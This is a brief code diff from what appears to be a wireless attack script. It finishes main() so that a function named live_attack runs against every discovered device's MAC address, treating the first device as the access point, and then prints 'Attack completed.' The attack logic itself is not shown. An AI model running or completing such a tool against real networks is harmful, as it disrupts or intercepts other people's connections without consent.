@@ -185,4 +185,10 @@ def main():
     # Live attack (if any devices were found)
     if devices:
         target_macs = list(devices.values())
-        access_point_mac = target_macs[
+        access_point_mac = target_macs[0]  # Simplified for this demo, could be user-input
+        live_attack(interface, target_macs, [access_point_mac]*len(target_macs))
+
+    print(f"{GOLD}Attack completed.{RESET}")
+
+if __name__ == "__main__":
+    main()
